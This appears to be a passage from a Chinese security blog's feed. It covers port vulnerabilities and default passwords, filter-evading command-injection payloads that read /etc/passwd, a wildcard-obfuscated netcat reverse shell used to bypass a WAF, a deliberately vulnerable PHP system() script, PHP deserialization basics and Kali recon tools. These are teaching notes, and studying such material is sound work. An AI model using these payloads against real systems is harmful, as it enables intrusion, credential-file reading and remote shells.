    <content type="html"><![CDATA[<h2 id="端口及对应的服务和漏洞"><a href="#端口及对应的服务和漏洞" class="headerlink" title="端口及对应的服务和漏洞"></a>端口及对应的服务和漏洞</h2><ul><li>20：FTP服务的数据传输端口</li><li>21：FTP服务的连接端口，可能存在  弱口令暴力破解</li></ul><a id="more"></a><ul><li>22：SSH服务端口，可能存在 弱口令暴力破解</li><li>23：Telnet端口，可能存在 弱口令暴力破解</li><li>25：SMTP简单邮件传输协议端口，和 POP3 的110端口对应</li><li>43：whois服务端口</li><li>53：DNS服务端口(TCP/UDP 53)</li><li>67/68：DHCP服务端口</li><li>69：TFTP端口，可能存在弱口令</li><li>80：HTTP端口，常见web漏洞</li><li>88：Kerberos协议端口</li><li>110：POP3邮件服务端口，和SMTP的25端口对应</li><li>135：RPC服务</li><li>137/138： NMB服务</li><li>139：SMB/CIFS服务</li><li>143：IMAP协议端口</li><li>161/162: Snmp服务，public弱口令</li><li>389：LDAP目录访问协议，有可能存在注入、弱口令</li><li>443：HTTPS端口，心脏滴血等与SSL有关的漏洞</li><li>445：SMB服务端口，可能存在永恒之蓝漏洞MS17-010</li><li>512/513/514：Linux Rexec服务端口，可能存在爆破</li><li>873：Rsync ，可能存在Rsync未授权访问漏洞，传送门：rsync 未授权访问漏洞</li><li>1080：socket端口，可能存在爆破</li><li>1099：RMI，可能存在 RMI反序列化漏洞</li><li>1352：Lotus domino邮件服务端口，可能存在弱口令、信息泄露</li><li>1433：SQL Server对外提供服务端口</li><li>1434：用于向请求者返回SQL Server使用了哪个TCP/IP端口</li><li>1521：oracle数据库端口</li><li>2049：NFS服务端口，可能存在NFS配置不当</li><li>2181：ZooKeeper监听端口，可能存在 ZooKeeper未授权访问漏洞</li><li>2375：Docker端口，可能存在 Docker未授权访问漏洞</li><li>2601:   Zebra ，默认密码zebr</li><li>3128:   squid ，匿名访问（可能内网漫游)</li><li>3268：LDAP目录访问协议，有可能存在注入、弱口令</li><li>3306：MySQL数据库端口，可能存在 弱口令暴力破解</li><li>3389：Windows远程桌面服务，可能存在 弱口令漏洞 或者 - CVE-2019-0708 远程桌面漏洞复现</li><li>3690：SVN服务，可能存在SVN泄漏，未授权访问漏洞</li><li>4440：Rundeck，弱口令admin</li><li>4560：log4j SocketServer监听的端口，可能存在 log4j&lt;=1.2.17反序列化漏洞（CVE-2019-17571）</li><li>4750：BMC，可能存在 BMC服务器自动化RSCD代理远程代码执行(CVE-2016-1542)</li><li>4848：GlassFish控制台端口，可能存在弱口令admin/adminadmin</li><li>5000：SysBase/DB2数据库端口，可能存在爆破、注入漏洞</li><li>5432：PostGreSQL数据库的端口</li><li>5632：PyAnywhere服务端口，可能存在代码执行漏洞</li><li>5900/5901：VNC监听端口，可能存在 VNC未授权访问漏洞</li><li>5984：CouchDB端口，可能存在 CouchDB未授权访问漏洞</li><li>6379：Redis数据库端口，可能存在Redis未授权访问漏洞，传送门：Redis未授权访问漏洞</li><li>7001/7002：Weblogic，可能存在Weblogic反序列化漏洞，传送门：Weblogic反序列化漏洞</li><li>7180：Cloudera manager端口</li><li>8069：Zabbix服务端口，可能存在Zabbix弱口令导致的Getshell漏洞</li><li>8080：Tomcat、JBoss，可能存在Tomcat管理页面弱口令Getshell，JBoss未授权访问漏洞，传送门：Tomcat管理弱口令页面Getshell</li><li>8080-8090：可能存在web服务</li><li>8089：Jetty、Jenkins服务端口，可能存在反序列化，控制台弱口令等漏洞</li><li>8161：Apache ActiveMQ后台管理系统端口，默认口令密码为：admin:admin ，可能存在CVE-2016-3088漏洞，传送门：Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）</li><li>9000：fastcgi端口，可能存在远程命令执行漏洞</li><li>9001：Supervisord，可能存在Supervisord远程命令执行漏洞(CVE-2017-11610)，传送门：Supervisord远程命令执行漏洞(CVE-2017-11610)</li><li>9043/9090：WebSphere，可能存在WebSphere反序列化漏洞</li><li>9200/9300：Elasticsearch监听端口，可能存在 Elasticsearch未授权访问漏洞</li><li>10000：Webmin-Web控制面板，可能存在弱口令</li><li>10001/10002：JmxRemoteLifecycleListener监听的，可能存在Tomcat反序列化漏洞，传送门：Tomcat反序列化漏洞(CVE-2016-8735)</li><li>11211：Memcached监听端口，可能存在 Memcached未授权访问漏洞</li><li>27017/27018：MongoDB数据库端口，可能存在 MongoDB未授权访问漏洞</li><li>50000：SAP Management Console服务端口，可能存在 运程命令执行漏洞。</li><li>50070：Hadoop服务端口，可能存在 Hadoop未授权访问漏洞</li><li>61616：Apache ActiveMQ服务端口，可能存在 Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）复现</li><li>60020：hbase.regionserver.port，HRegionServer的RPC端口</li><li>60030：hbase.regionserver.info.port，HRegionServer的http端口</li></ul><hr><h2 id="端口相关的命令（Windows）"><a href="#端口相关的命令（Windows）" class="headerlink" title="端口相关的命令（Windows）"></a>端口相关的命令（Windows）</h2><ul><li>netstat -a  显示一个所有的有效连接信息列表，包括已建立的连接（ESTABLISHED ），也包括监听连接请求（LISTENING ）的那些连接，<br>断开连接（CLOSE_WAIT ）或者处于联机等待状态的（TIME_WAIT ）等</li><li>netstat -n  以数字形式显示地址和端口号,显示所有已建立的有效连接</li><li>netstat -ano  列出所有端口的情况</li><li>netstat -ano|findstr “80”  查看被占用端口80对应的应用的PID</li><li>tasklist|findstr “80”  查看80端口被哪个进程或程序占用</li><li>结束该进程或程序：taskkill /f /t /im  XX.exe  结束该进程或程序</li></ul><hr><h2 id="Nmap中常见的服务"><a href="#Nmap中常见的服务" class="headerlink" title="Nmap中常见的服务"></a>Nmap中常见的服务</h2><ol><li>msmq?：默认对应的是1801端口，是MSMQ Microsoft Message Queuing（微软消息队列）的简称，是windows系统提供的一个功能，开启了该功能，则默认1801端口打开。该服务暂未发现漏洞。 </li><li>msrpc：Microsoft Remote Procedure Call（微软远程过程调用）是 Windows 操作系统使用的一个协议。该服务开启时对应端口2103、2105、2107开启。RPC 提供一种内部进程通讯机制，允许在一台电脑上运行的程序无缝的执行远程系统中的代码。</li><li>tcpwrapped：端口状态后经常标记tcpwrapped。tcpwrapped表示服务器运行 tcp_wrappers服务。该服务对应端口10050。tcp_wrappers是一种应用级防火墙。它可以根据预设，对SSH、Telnet、FTP服务的请求进行拦截，判断是否符合预设要求。如果符合，就会转发给对应的服务进程；否则，会中断连接请求。这说明tcp三次握手已经完成，但是并没有和目标主机建立连接。这表明，虽然目标主机的某项服务是可提供的，但你不在允许访问主机的名单列表中。当大量的端口服务都为tcpwrapped时，这说明可能是有负载均衡或者防火墙阻断了你的连接请求。</li><li>Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)：这是SQL Server中的SQL Reporting Service 服务使用的Microsoft HTTPAPI。该服务对应端口5985。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;端口及对应的服务和漏洞&quot;&gt;&lt;a href=&quot;#端口及对应的服务和漏洞&quot; class=&quot;headerlink&quot; title=&quot;端口及对应的服务和漏洞&quot;&gt;&lt;/a&gt;端口及对应的服务和漏洞&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;20：FTP服务的数据传输端口&lt;/li&gt;
&lt;li&gt;21：FTP服务的连接端口，可能存在  弱口令暴力破解&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="http://black0saturday.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>命令执行绕过空格的姿势</title>
    <link href="http://black0saturday.github.io/2020/03/27/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E7%9A%84%E5%A7%BF%E5%8A%BF/"/>
    <id>http://black0saturday.github.io/2020/03/27/命令执行绕过空格的姿势/</id>
    <published>2020-03-27T02:42:32.000Z</published>
    <updated>2020-04-02T04:05:54.691Z</updated>
    
    <content type="html"><![CDATA[<p>在一些漏洞利用场景（如命令执行，SQL注入），或者因为waf等原因，导致无法使用空格时，可以试试如下命令：<br><a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">IFS&#x3D;,;&#96;cat&lt;&lt;&lt;cat,&#x2F;etc&#x2F;passwd&#96;</span><br><span class="line">cat$IFS&#x2F;etc&#x2F;passwd</span><br><span class="line">cat$&#123;IFS&#125;&#x2F;etc&#x2F;passwd</span><br><span class="line">cat&lt;&#x2F;etc&#x2F;passwd</span><br><span class="line">&#123;cat,&#x2F;etc&#x2F;passwd&#125;</span><br><span class="line">X&#x3D;$&#39;cat\x20&#x2F;etc&#x2F;passwd&#39;&amp;&amp;$X</span><br></pre></td></tr></table></figure><p>经过测试，除最后一条在mac osx下执行失败，这些命令在ubuntu 19.10和centos7下均执行成功。在mac osx系统下系统会将cat\x20/etc/passwd当成一个可执行文件，会提示No such file or directory。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在一些漏洞利用场景（如命令执行，SQL注入），或者因为waf等原因，导致无法使用空格时，可以试试如下命令：&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="http://black0saturday.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>bash和通配符用法</title>
    <link href="http://black0saturday.github.io/2020/03/25/bash%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6%E7%94%A8%E6%B3%95/"/>
    <id>http://black0saturday.github.io/2020/03/25/bash和通配符用法/</id>
    <published>2020-03-25T09:14:24.000Z</published>
    <updated>2020-04-03T03:09:02.159Z</updated>
    
    <content type="html"><![CDATA[<h3 id="特殊的通配符用法"><a href="#特殊的通配符用法" class="headerlink" title="特殊的通配符用法"></a>特殊的通配符用法</h3><p>Bash 标准通配符（也称为通配符模式）被各种命令行实用程序用于处理多个文件。并不是每个人都知道 bash 语法可以使用问号 <code>?</code>、正斜杠 <code>/</code>、数字和字母来执行系统命令。你甚至可以枚举文件并使用相同数量的字符获取其内容。<br><a id="more"></a><br>举几个例子：<br>可以使用以下语法来取代 ls 命令：<code>/???/?s</code><br><img src="/2020/03/25/bash%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6%E7%94%A8%E6%B3%95/1.png" alt><br>用这种语法，你可以基本做到你想做的任何事情。假设存在漏洞的目标位于WAF的后面，并且此 WAF 有一条规则，该规则可阻止包含 <code>/etc/passwd</code> 或 <code>/bin/ls</code> 在 GET 参数的值内或 POST 正文中的所有请求。</p><p>如果你试图发出这样的请求，<code>/?cmd=cat+/etc/passwd</code> 它将被目标 WAF 阻止，你的 IP 将被永久禁止，并被标记为 <strong>yet another f*</strong>in’ redteamer**。但你有通配符这个秘密武器。</p><p>如果目标 WAF 不阻止查询字符串里的 <code>?</code> 和 <code>/</code>，你就可以很容易地让你的请求（url 编码）变成这样：<code>/?cmd=%2f???%2f??t%20%2f???%2fp??s??</code><br><img src="/2020/03/25/bash%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6%E7%94%A8%E6%B3%95/2.png" alt><br>上图所示，有 3 个错误：<code>/bin/cat *: Is a directory</code>。发生这种情况是因为 <code>/???/?t</code> 可以被全局进程解释成 <code>/bin/cat</code>，也可以解释成 <code>/dev/net</code> 或 <code>/etc/apt</code> 等。</p><p>问号通配符可以代表任何字符。因此，如果你知道一个文件名的一部分，那么你可以使用这个通配符。例如，<code>ls *.???</code> 将列出当前目录中所有长度为 3 个字符的文件扩展名。因此，你将会看到具有诸如 .gif，.jpg，.txt 之类扩展名的文件。</p><p>使用这个通配符，你可以用 <code>netcat</code> 执行一个反弹 shell。假设你需要在端口 1337（通常 <code>nc -e /bin/bash 127.0.0.1 1337</code>）执行一个 127.0.0.1 的反弹 shell ，你可以用下面的语法来完成：<br>    /???/n? -e /???/b??h 2130706433 1337</p><p>将 IP 地址127.0.0.1转换为长整数格式（2130706433），可以避免在 HTTP 请求中使用 . 字符。</p><p>在 kali 中，需要使用 <code>nc.traditional</code> 而不是 <code>nc</code>，没有 <code>-e</code>参数，以便 <code>/bin/bash</code> 连接后执行。有效载荷变成这样：</p><pre><code>/???/?c.??????????? -e /???/b??h 2130706433 1337</code></pre><p><img src="/2020/03/25/bash%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6%E7%94%A8%E6%B3%95/3.gif" alt><br>使用通配符执行反弹 shell<br>在对我们刚才看到的两个命令进行总结：</p><blockquote><p>标准：/bin/nc 127.0.0.1 1337<br>绕过：/???/n? 2130706433 1337<br>使用字符：/ ? n [0-9]</p></blockquote><blockquote><p>标准：/bin/cat /etc/passwd<br>绕过：/???/??t /???/??ss??<br>使用字符：/ ? t s</p></blockquote><p>为什么使用 <code>?</code> 而不是 <code>*?</code>由于<code>*</code>广泛用于评论语法，许多 WAF 为了避免 SQL 注入而过滤它，像 <code>UNION+SELECT+1,2,3/*</code></p><p>使用 echo 来枚举文件和目录。该 echo 命令可以使用通配符枚举文件系统上的文件和目录。例如 <code>echo /*/*ss*</code>:<br><img src="/2020/03/25/bash%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6%E7%94%A8%E6%B3%95/4.webp" alt></p><p>这命令可以在 RCE 漏洞中使用，以获取目标系统上的文件和目录，例如：<br><img src="/2020/03/25/bash%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6%E7%94%A8%E6%B3%95/5.webp" alt><br>但为什么使用通配符（特别是问号）可以绕过WAF？</p><h3 id="Sucuri-WAF绕过"><a href="#Sucuri-WAF绕过" class="headerlink" title="Sucuri WAF绕过"></a>Sucuri WAF绕过</h3><p><img src="/2020/03/25/bash%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6%E7%94%A8%E6%B3%95/6.webp" alt><br>测试 WAF 规则集的最佳方法是什么？创建一个有漏洞的 PHP 脚本，并尝试所有可能的技术。在上图的左上方的窗格中，是一个有漏洞的PHP脚本。</p><pre><code>&lt;?php    echo &apos;ok: &apos;;    print_r($_GET[&apos;c&apos;]);    system($_GET[&apos;c&apos;]);?&gt;</code></pre><p>在左下方的窗格中，你可以看到对这个网站（test1.unicresit.it）进行远程命令执行测试。正如你所看到的，Sucuri WAF 以 <strong>An attempted RFI/LFI was detected and blocked</strong> 理由阻止请求。</p><p>右窗格显示了同样的请求，但却使用 <code>?</code> 作为通配符，结果是 Sucuri WAF 没有阻止这个请求，应用程序执行了放入 <code>c</code> 参数的命令。现在就可以读取 <code>/etc/passwd</code> 文件，甚至更多。</p><p>我可以读取应用程序本身的 PHP 源代码，可以使用 netcat（<code>/???/?c</code>）执行反弹 shell，或者我可以执行 curl 或 wget 来获取网络服务器的真实 IP，使我能够通过直接连接目标来绕过 WAF。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>使用一些不常用的bash命令的技巧，还是可以绕过WAF的防护的。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;特殊的通配符用法&quot;&gt;&lt;a href=&quot;#特殊的通配符用法&quot; class=&quot;headerlink&quot; title=&quot;特殊的通配符用法&quot;&gt;&lt;/a&gt;特殊的通配符用法&lt;/h3&gt;&lt;p&gt;Bash 标准通配符（也称为通配符模式）被各种命令行实用程序用于处理多个文件。并不是每个人都知道 bash 语法可以使用问号 &lt;code&gt;?&lt;/code&gt;、正斜杠 &lt;code&gt;/&lt;/code&gt;、数字和字母来执行系统命令。你甚至可以枚举文件并使用相同数量的字符获取其内容。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="http://black0saturday.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化</title>
    <link href="http://black0saturday.github.io/2020/03/23/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://black0saturday.github.io/2020/03/23/PHP反序列化/</id>
    <published>2020-03-23T02:46:46.000Z</published>
    <updated>2020-04-02T06:49:41.552Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> 考研用了一年，好久没写博客了，安全也很久没搞了，最近重新学了一遍以前自己的笔记，今天学到PHP序列化和反序列化，之前对这个概念就模模糊糊的，今天正好弄清楚。</p><a id="more"></a><h3 id="0x00：PHP序列化"><a href="#0x00：PHP序列化" class="headerlink" title="0x00：PHP序列化"></a>0x00：PHP序列化</h3><h4 id="序列化函数：serialize"><a href="#序列化函数：serialize" class="headerlink" title="序列化函数：serialize()"></a>序列化函数：serialize()</h4><p>所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。</p><p><strong>变量所储存的数据是内存数据，在程序执行结束时，内存数据便会立即销毁；而文件、数据库是“持久存储”，因此PHP序列化就是将内存的数据保存到文件中的过程。</strong></p><ol><li>$s = serialize($变量); //该函数将变量数据进行序列化转换为字符串</li><li>file_put_contents(‘./目标文本文件’, $s); //将$s保存到指定文件</li></ol><h4 id="For-example"><a href="#For-example" class="headerlink" title="For example"></a>For example</h4><pre><code>&lt;?phpclass User{    // 创建类数据    public $age = 0;    public $name = &apos;&apos;;    // 输出数据    public function PrintData()    {        echo &apos;User &apos; . $this-&gt;name . &apos; is &apos; .$this-&gt;age . &apos; years old.&apos;;        echo &quot;\n&quot;;    }}// 创建一个对象$usr = new User();// 设置数据$usr-&gt;age = 20;$usr-&gt;name = &apos;lemon&apos;;// 输出数据$usr-&gt;PrintData();// 输出序列化之后的数据echo serialize($usr);echo &quot;\n&quot;;?&gt;</code></pre><p>输出序列化后的结果</p><ol><li>User lemon is 20 years old. </li><li>O:4:”User”:2:{s:3:”age”;i:20;s:4:”name”;s:5:”lemon”;}</li></ol><p>可以看到序列化一个对象后会保存对象的所有变量，并且发现序列化后的结果都有一个字符，这些字符都是一下字母的缩写。</p><ul><li>a array                 </li><li>b boolean  </li><li>d double               </li><li>i integer</li><li>o common object </li><li>r reference</li><li>s string </li><li>C custom object</li><li>O class</li><li>N null</li><li>R pointer reference </li><li>U unicode string</li></ul><p>了解了缩写字母的含义，就可以解读序列化后的含义</p><ol><li>O:4:”User”:2:{s:3:”age”;i:20;s:4:”name”;s:5:”lemon”;}</li><li>对象类型:长度:”类名”:类中变量的个数:{类型:长度:”值”;类型:长度:”值”;……}</li></ol><p>通过这个例子，应该能理解序列化函数serialize()的功能</p><h3 id="0x01：PHP反序列化"><a href="#0x01：PHP反序列化" class="headerlink" title="0x01：PHP反序列化"></a>0x01：PHP反序列化</h3><p>函数：unserialize()</p><blockquote><p>unserialize()对单一的已序列化的变量进行操作，将其转回PHP的值。在解序列化一个对象前，这个对象的类必须在解序列化之前定义。</p></blockquote><p>简单理解起来就是<strong>将序列化过存储到文件中的数据，恢复到程序代码的变量表示形式的过程</strong>，恢复到变量序列化之前的结果。</p><pre><code>$s = file_get_contents(‘./目标文本文件’); //取得文本文件的内容（之前序列化过的字符串）$变量 = unserialize($s); //将该文本内容，反序列化到指定的变量中</code></pre><h4 id="For-example-1"><a href="#For-example-1" class="headerlink" title="For example"></a>For example</h4><pre><code>&lt;?php    // 某类    class User    {        // Class data        public $age = 0;        public $name = &apos;&apos;;        // Print data        public function PrintData()        {            echo &apos;User &apos; . $this-&gt;name . &apos; is &apos; . $this-&gt;age . &apos; years old.&apos;;            echo &quot;\n&quot;;        }    }    // 重建对象    $usr = unserialize(&apos;O:4:&quot;User&quot;:2:{s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:5:&quot;lemon&quot;;}&apos;);    // 调出PrintData输出数据    $usr-&gt;PrintData();?&gt;</code></pre><p>输出结果：</p><blockquote><p>User lemon is 20 years old.</p></blockquote><p><strong>注意：在解序列化一个对象前，这个对象的类必须在解序列化之前定义。否则会报错</strong></p><p>在先知上看大师傅举得例子对序列化和反序列化的介绍，也很好理解。</p><pre><code>&lt;?phpclass A{    var $test = &quot;demo&quot;;}$a = new A(); //生成a对象$b = serialize($a); //序列化a对象为b$c = unserialize($b); //反序列化b对象为cprint_r($b); //输出序列化之后的值echo &quot;\n&quot;;print_r($c-&gt;test); //输出对象c中test的值：demo?&gt;</code></pre><h3 id="0x02：PHP反序列化漏洞"><a href="#0x02：PHP反序列化漏洞" class="headerlink" title="0x02：PHP反序列化漏洞"></a>0x02：PHP反序列化漏洞</h3><p>在学习漏洞前，先来了解一下PHP魔法函数，对接下来的学习会很有帮助</p><blockquote><p>PHP将所有以__(两个下划线)开头的类方法保留为魔术方法</p></blockquote><ol><li>__construct   当一个对象创建时被调用，</li><li>__destruct   当一个对象销毁时被调用，</li><li>__toString   当一个对象被当作一个字符串被调用。</li><li>__wakeup()   使用unserialize时触发</li><li>__sleep()    使用serialize时触发</li><li>__destruct()    对象被销毁时触发</li><li>__call()    在对象上下文中调用不可访问的方法时触发</li><li>__callStatic()    在静态上下文中调用不可访问的方法时触发</li><li>__get()    用于从不可访问的属性读取数据</li><li>__set()    用于将数据写入不可访问的属性</li><li>__isset()    在不可访问的属性上调用isset()或empty()触发</li><li>__unset()     在不可访问的属性上使用unset()时触发</li><li>__toString()    把类当作字符串使用时触发,返回值需要为字符串</li><li>__invoke()   当脚本尝试将对象调用为函数时触发</li></ol><p>这里只列出了一部分的魔法函数，具体可见<br><a href="https://www.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/language.oop5.magic.php</a></p><p>下面通过一个例子来简单了解一下魔法函数被自动调用的过程</p><pre><code>&lt;?phpclass test{ public $varr1=&quot;abc&quot;; public $varr2=&quot;123&quot;; public function echoP(){  echo $this-&gt;varr1.&quot;&lt;br&gt;&quot;; } public function __construct(){  echo &quot;__construct&lt;br&gt;&quot;; } public function __destruct(){  echo &quot;__destruct&lt;br&gt;&quot;; } public function __toString(){  return &quot;__toString&lt;br&gt;&quot;; } public function __sleep(){  echo &quot;__sleep&lt;br&gt;&quot;;  return array(&apos;varr1&apos;,&apos;varr2&apos;); } public function __wakeup(){  echo &quot;__wakeup&lt;br&gt;&quot;; }}$obj = new test();  //实例化对象，调用__construct()方法，输出__construct$obj-&gt;echoP();   //调用echoP()方法，输出&quot;abc&quot;echo $obj;//obj对象被当做字符串输出，调用__toString()方法，输出__toString$s =serialize($obj);  //obj对象被序列化，调用__sleep()方法，输出__sleepecho unserialize($s);  //$s首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被当做字符串，就会调用_toString()方法。// 脚本结束又会调用__destruct()方法，输出__destruct?&gt;</code></pre><h2 id="未完待续！！"><a href="#未完待续！！" class="headerlink" title="未完待续！！"></a>未完待续！！</h2>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt; 考研用了一年，好久没写博客了，安全也很久没搞了，最近重新学了一遍以前自己的笔记，今天学到PHP序列化和反序列化，之前对这个概念就模模糊糊的，今天正好弄清楚。&lt;/p&gt;
    
    </summary>
    
    
      <category term="PHP" scheme="http://black0saturday.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>kali中的信息收集工具</title>
    <link href="http://black0saturday.github.io/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/"/>
    <id>http://black0saturday.github.io/2018/12/06/kali中的信息收集工具/</id>
    <published>2018-12-06T01:42:02.000Z</published>
    <updated>2020-04-18T03:12:08.188Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>信息收集的方式可以分为两种：</p><ul><li>主动和被动。主动的信息收集方式：通过直接访问、扫描网站，这种将流量流经网站的行为。</li><li>被动的信息收集方式：利用第三方的服务对目标进行访问了解，比例：Google搜索。</li></ul><a id="more"></a><p>信息收集要收集什么呢：</p><ul><li>域名的信息</li><li>DNS</li><li>IP</li><li>使用的技术和配置，文件，联系方式等等。</li></ul><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>没有一种方式是最完美的，每个方式都有自己的优势。</p><ul><li>主动方式，你能获取更多的信息，但是目标主机可能会记录你的操作记录。</li><li>被动方式，你收集的信息会先对少，但是你的行动并不会被目标主机发现。一般在一个渗透项目下，你需要有多次的信息收集，同时也要运用不同的收集方式，才能保证信息收集的完整性。</li></ul><h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><h3 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h3><p>关于Whois的介绍请访问: <a href="https://www.ietf.org/rfc/rfc3912.txt‍" target="_blank" rel="noopener">https://www.ietf.org/rfc/rfc3912.txt‍</a></p><pre><code>#whois baidu.com</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/1.png" alt></p><p>我们可以获取关于百度的DNS服务器信息，域名注册基本信息。这些信息在以后的测试阶段中有可能会发挥重大的作用。</p><p>除了使用whois命令，也有一些网站提供在线whois信息查询：</p><p><a href="http://whois.chinaz.com/" target="_blank" rel="noopener">http://whois.chinaz.com/</a></p><p><a href="http://www.internic.net/whois.html" target="_blank" rel="noopener">http://www.internic.net/whois.html</a><br>收集完域名信息之后，我们将开始收集关于DNS服务器的详细信息。</p><h3 id="DNS分析工具-host"><a href="#DNS分析工具-host" class="headerlink" title="DNS分析工具-host"></a>DNS分析工具-host</h3><p>使用DNS分析工具的目的在于收集有关DNS服务器和测试目标的相应记录信息。</p><p>以下是几种常见的DNS记录类型：<br><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/1.jpg" alt></p><p>在获取DNS服务器信息之后，下一步就是借助DNS服务器找出目标主机IP地址。我们可以使用下面的命令行工具来借助一个DNS服务器查找目标主机的IP地址：</p><pre><code>host www.baidu.com</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/2.png" alt></p><p>我们可以看到 有两个IP地址？？</p><p>一般情况下，host查找的是A，AAAA，和MX的记录。</p><p>查询详细的记录只需要添加 -a</p><pre><code>#host -a baidu.com 8.8.8.8</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/3.png" alt></p><h3 id="dig"><a href="#dig" class="headerlink" title="dig"></a>dig</h3><p>除了host命令，你也可以使用dig命令对DNS服务器进行挖掘。相对于host命令，dig命令更具有灵活和清晰的显示信息。</p><pre><code>#dig baidu.com</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/4.png" alt></p><p>不使用选项的dig命令，只返回一个记录。如果要返回全部的记录，只需要在命令添加给出的类型：</p><pre><code>#dig baidu.com any</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/5.png" alt></p><h3 id="dnsenum"><a href="#dnsenum" class="headerlink" title="dnsenum"></a>dnsenum</h3><p>我们可以利用dnsenum从DNS服务器上获取以下信息：</p><pre><code>1. 主机IP地址2. 该域名的DNS服务器3. 该域名的MX记录</code></pre><p>除了被用来获取DNS信息，dnsenum还具有以下特点：</p><pre><code>1. 使用谷歌浏览器获取子域名2. 暴力破解3. C级网络扫描4. 反向查找网络</code></pre><p>命令：</p><pre><code>#dnsnum baidu.com</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/6.png" alt></p><h3 id="fierce"><a href="#fierce" class="headerlink" title="fierce"></a>fierce</h3><p>fierce 是使用多种技术来扫描目标主机IP地址和主机名的一个DNS服务器枚举工具。运用递归的方式来工作。它的工作原理是先通过查询本地DNS服务器来查找目标DNS服务器，然后使用目标DNS服务器来查找子域名。fierce的主要特点就是可以用来地位独立IP空间对应域名和主机名。</p><p>启动fierce使用的命令：</p><pre><code>#fierce -h</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/7.png" alt></p><p>举例：</p><pre><code>#fierce  -dns baidu.com -threads 3</code></pre><p><img src="/2018/12/06/kali%E4%B8%AD%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/8.png" alt></p><h3 id="DMitry"><a href="#DMitry" class="headerlink" title="DMitry"></a>DMitry</h3><p>DMitry（Deepmagic Information Gathering Tool）是一个一体化的信息收集工具。它可以用来收集以下信息：</p><pre><code>1. 端口扫描2. whois主机IP和域名信息3. 从Netcraft.com获取主机信息4. 子域名5. 域名中包含的邮件地址</code></pre><p>尽管这些信息可以在Kali中通过多种工具获取，但是使用DMitry可以将收集的信息保存在一个文件中，方便查看。</p><p>举例：</p><pre><code>#dmitry -winse baidu.com</code></pre><p><img 